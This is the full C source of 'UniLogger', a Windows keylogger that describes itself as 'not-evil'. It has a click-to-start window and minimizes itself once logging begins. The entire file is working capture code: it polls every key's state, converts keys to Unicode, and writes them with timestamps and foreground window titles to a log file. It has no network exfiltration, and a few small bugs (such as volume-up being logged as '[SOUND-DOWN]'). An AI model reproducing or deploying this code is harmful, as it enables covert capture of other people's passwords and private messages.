#include <windows.h>
#include "resource.h"
#include <stdio.h>


/************************************************
*					[UniLogger]					*
*  A "not-evil" keylogger with Unicode support	*
*************************************************		
- @SherifEldeeb
- http://eldeeb.net
- Made in Egypt :)
************************************************/
/*
Copyright (c) 2013, Sherif Eldeeb "eldeeb.net"
All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met: 

1. Redistributions of source code must retain the above copyright notice, this
list of conditions and the following disclaimer. 
2. Redistributions in binary form must reproduce the above copyright notice,
this list of conditions and the following disclaimer in the documentation
and/or other materials provided with the distribution. 

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

The views and conclusions contained in the software and documentation are those
of the authors and should not be interpreted as representing official policies, 
either expressed or implied, of the FreeBSD Project.
*/

HWND hwnd;
int nBitmap = IDB_BITMAP2;
TCHAR *winText = L"Not Logging...\n\nClick to (start/stop)\n\nhttp://eldeeb.net";

DWORD nThreadId;
HANDLE hThreadHandle;

TCHAR	window_text[1024] = {0};
TCHAR	old_window_text[1024] = {0};
HWND	hWindowHandle;
TCHAR	wszAppName[1024] = {0};
DWORD	dwBytesWritten = 0;
unsigned char header[2] = { 0xFF, 0xFE }; //unicode text file header
HANDLE hFile = INVALID_HANDLE_VALUE;
wchar_t log_file[MAX_PATH] = {0};
SYSTEMTIME LocalTime = {0};

TCHAR *save_log(void) {
	OPENFILENAME    ofn = {0};
	TCHAR filename[512] = {0};
	GetLocalTime(&LocalTime);
	_snwprintf((wchar_t*)filename, 511, L"%04d%02d%02d-%02d%02d%02d.log", LocalTime.wYear, LocalTime.wMonth, LocalTime.wDay, LocalTime.wHour, LocalTime.wMinute, LocalTime.wSecond);

	ofn.lStructSize     = sizeof(ofn);
	ofn.lpstrFilter		= L"Log files (*.log)\0*.LOG\0All Files\0*.*\0";
	ofn.lpstrFile       = filename;
	ofn.nMaxFile        = sizeof(filename);
	ofn.lpstrTitle      = L"UniLogger - Select keylog Location";
	ofn.Flags           = OFN_NONETWORKBUTTON | OFN_OVERWRITEPROMPT | OFN_PATHMUSTEXIST | OFN_LONGNAMES | OFN_EXPLORER | OFN_HIDEREADONLY;
	ofn.nFilterIndex	= 1;

	if(!GetSaveFileName(&ofn)) exit(1);
	TCHAR *buff = (TCHAR*)malloc(512);
	ZeroMemory(buff,512);
	memcpy(buff,filename,wcslen(filename) * sizeof(TCHAR));
	return(buff);
}

void WriteToFile(TCHAR *wText)
{
	hFile = CreateFile(log_file, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL,NULL);
	WriteFile(hFile, wText, wcslen(wText) * sizeof(wchar_t), &dwBytesWritten, NULL);
	CloseHandle(hFile);
}

void WritesScannedKeyToFile(short sScannedKey)
{
	HKL hkl;
	DWORD dwThreadId;
	DWORD dwProcessId;

	hWindowHandle = GetForegroundWindow();
	dwThreadId = GetWindowThreadProcessId(hWindowHandle, &dwProcessId);
	BYTE *kState = (BYTE*)malloc(256);
	GetKeyboardState(kState);
	hkl = GetKeyboardLayout(dwThreadId);
	wchar_t UniChar[16] = {0};
	UINT virtualKey = MapVirtualKeyEx((UINT)sScannedKey, MAPVK_VK_TO_CHAR, hkl);
	ToUnicodeEx(virtualKey, sScannedKey, (BYTE*)kState, UniChar, 16, NULL, hkl);
	WriteToFile(UniChar);
	free(kState);
}

DWORD WINAPI logger(void)
{

	wcscpy_s(log_file, save_log());

	hFile = CreateFile(log_file, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL,NULL);
	WriteFile(hFile, header, 2, &dwBytesWritten, NULL);
	CloseHandle(hFile);

	short sScannedKey;
	while(1)
	{
		Sleep((rand() % 50) + 20);
		for(sScannedKey=8;sScannedKey<=222;sScannedKey++)
		{
			if(GetAsyncKeyState(sScannedKey)==-32767)
			{   
				//check window name, has it changed?
				hWindowHandle = GetForegroundWindow();
				if (hWindowHandle != NULL)
				{
					if (GetWindowText(hWindowHandle, window_text, 1024) != 0)
					{
						if (wcscmp(window_text, old_window_text) != 0)
						{
							hFile = CreateFile(log_file, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL,NULL);
							GetLocalTime(&LocalTime);
							_snwprintf_s(wszAppName, 1023, L"\n\n%04d/%02d/%02d %02d:%02d:%02d - {%s}\n", LocalTime.wYear, LocalTime.wMonth, LocalTime.wDay, LocalTime.wHour, LocalTime.wMinute, LocalTime.wSecond,window_text);
							WriteFile(hFile, wszAppName, wcslen(wszAppName) * sizeof(wchar_t), &dwBytesWritten, NULL);
							wcscpy_s(old_window_text, window_text);
							CloseHandle(hFile);
						}
					}
				}

				// end of window name & title check.

				if(true)
				{        
					if((sScannedKey>=39)&&(sScannedKey<91))
					{
						WritesScannedKeyToFile(sScannedKey);
						break;
					}    
					else
					{ 
						switch(sScannedKey)
						{
							//http://msdn.microsoft.com/en-us/library/windows/desktop/dd375731(v=vs.85).aspx
						case VK_SPACE:
							WriteToFile(L" ");
							break;    
						case VK_SHIFT:
							WriteToFile(L"[SHIFT]");
							break;                                            
						case VK_RETURN:
							WriteToFile(L"[ENTER]");
							break;
						case VK_BACK:
							WriteToFile(L"[BACKSPACE]");
							break;
						case VK_TAB:
							WriteToFile(L"[TAB]");
							break;
						case VK_CONTROL:
							WriteToFile(L"[CTRL]");
							break;    
						case VK_DELETE:
							WriteToFile(L"[DEL]");
							break;
							/*
							case VK_OEM_1:
							WriteToFile(L"[;:]");
							break;
							case VK_OEM_2:
							WriteToFile(L"[/?]");
							break;
							case VK_OEM_3:
							WriteToFile(L"[`~]");
							break;
							case VK_OEM_4:
							WriteToFile(L"[ [{ ]");
							break;
							case VK_OEM_5:
							WriteToFile(L"[\\|]");
							break;                                
							case VK_OEM_6:
							WriteToFile(L"[ ]} ]");
							break;
							case VK_OEM_7:
							WriteToFile(L"['\"]");
							break;*/
						case VK_OEM_PLUS:
							WriteToFile(L"+");
							break;
						case VK_OEM_COMMA:
							WriteToFile(L",");
							break;
						case VK_OEM_MINUS:
							WriteToFile(L"-");
							break;
						case VK_OEM_PERIOD:
							WriteToFile(L".");
							break;
						case VK_NUMPAD0:
							WriteToFile(L"0");
							break;
						case VK_NUMPAD1:
							WriteToFile(L"1");
							break;
						case VK_NUMPAD2:
							WriteToFile(L"2");
							break;
						case VK_NUMPAD3:
							WriteToFile(L"3");
							break;
						case VK_NUMPAD4:
							WriteToFile(L"4");
							break;
						case VK_NUMPAD5:
							WriteToFile(L"5");
							break;
						case VK_NUMPAD6:
							WriteToFile(L"6");
							break;
						case VK_NUMPAD7:
							WriteToFile(L"7");
							break;
						case VK_NUMPAD8:
							WriteToFile(L"8");
							break;
						case VK_NUMPAD9:
							WriteToFile(L"9");
							break;
						case VK_CAPITAL:
							WriteToFile(L"[CAPS LOCK]");
							break;
						case VK_PRIOR:
							WriteToFile(L"[PAGE UP]");
							break;
						case VK_NEXT:
							WriteToFile(L"[PAGE DOWN]");
							break;
						case VK_END:
							WriteToFile(L"[END]");
							break;
						case VK_HOME:
							WriteToFile(L"[HOME]");
							break;
						case VK_LWIN:
							WriteToFile(L"[WIN]");
							break;
						case VK_RWIN:
							WriteToFile(L"[WIN]");
							break;
						case VK_VOLUME_MUTE:
							WriteToFile(L"[SOUND-MUTE]");
							break;
						case VK_VOLUME_DOWN:
							WriteToFile(L"[SOUND-DOWN]");
							break;
						case VK_VOLUME_UP:
							WriteToFile(L"[SOUND-DOWN]");
							break;
						case VK_MEDIA_PLAY_PAUSE:
							WriteToFile(L"[MEDIA-PLAY/PAUSE]");
							break;
						case VK_MEDIA_STOP:
							WriteToFile(L"[MEDIA-STOP]");
							break;
						case VK_MENU:
							WriteToFile(L"[ALT]");
							break;
						default:

							break;
						}        
					}    
				}        
			}    
		}                  

	}
	return EXIT_SUCCESS;                            
}                           

LRESULT CALLBACK WndProc(HWND hwnd, UINT message, WPARAM wparam, LPARAM lparam ) 
{
	switch(message)
	{
	case WM_PAINT:
		{
			HDC hdc;
			HDC hMemDC;
			PAINTSTRUCT ps;
			HBITMAP hBitmapS;
			RECT rect;

			hdc = BeginPaint( hwnd, &ps );
			//image
			hBitmapS = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(nBitmap)); 
			hMemDC = CreateCompatibleDC(hdc);
			SelectObject(hMemDC, hBitmapS);
			BitBlt(hdc,10,10,121,106,hMemDC,0,0,SRCCOPY);
			//text
			GetClientRect(hwnd, &rect);
			rect.left = (rect.right / 2) - 40;
			rect.top = rect.top + 10;
			DrawText(hdc, winText, -1, &rect, DT_CENTER |  DT_END_ELLIPSIS  );

			//cleanuop
			DeleteDC(hMemDC);
			EndPaint( hwnd, &ps );
		}
		return 0;
		break;

	case WM_LBUTTONDOWN:
		if (nBitmap == IDB_BITMAP1) {
			nBitmap = IDB_BITMAP2;
			winText = L"Not Logging...\n\nClick to (start/stop)\n\nhttp://eldeeb.net";
			CloseHandle(hThreadHandle);

		}
		else if (nBitmap == IDB_BITMAP2) {
			nBitmap = IDB_BITMAP1;
			winText = L"Logging!\n\nClick to (start/stop)\n\nhttp://eldeeb.net";
			hThreadHandle = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)logger, NULL, NULL, &nThreadId);
			ShowWindow(hwnd, SW_MINIMIZE);
		}
		InvalidateRect(hwnd,NULL, true);
		return 0;
		break;

	case WM_DESTROY:
		PostQuitMessage( 0 ) ;
		return 0;
		break;

	}
	return DefWindowProc(hwnd, message, wparam, lparam);
}

int WINAPI WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR szCmdLine, int iCmdShow)
{
	srand(GetTickCount());
	//
	WNDCLASSEX wcx = {0};
	wcx.cbSize = sizeof(WNDCLASSEX);
	wcx.hbrBackground = (HBRUSH)GetStockObject( WHITE_BRUSH );
	wcx.hCursor = LoadCursor( NULL, IDC_ARROW );
	wcx.hIcon = LoadIcon( GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON1));
	wcx.hInstance = hInstance; 
	wcx.lpfnWndProc = WndProc;
	wcx.lpszClassName = TEXT("UniLogger");
	wcx.lpszMenuName = TEXT("Menu");    // no menu - ignore
	wcx.style = CS_HREDRAW | CS_VREDRAW; // Redraw the window
	wcx.hIconSm = LoadIcon( GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON1));
	//
	RegisterClassEx(&wcx);
	//
	hwnd = CreateWindow(TEXT("UniLogger"),TEXT("UniLogger!"),
		(WS_OVERLAPPED	| WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX),
		CW_USEDEFAULT, CW_USEDEFAULT, 350, 170, NULL, NULL, hInstance, NULL );
	ShowWindow(hwnd, iCmdShow);
	UpdateWindow(hwnd);
	MSG msg;
	while( GetMessage( &msg, NULL, 0, 0 ) )
	{
		TranslateMessage( &msg );  
		DispatchMessage( &msg );
	}
	return msg.wParam; 
}

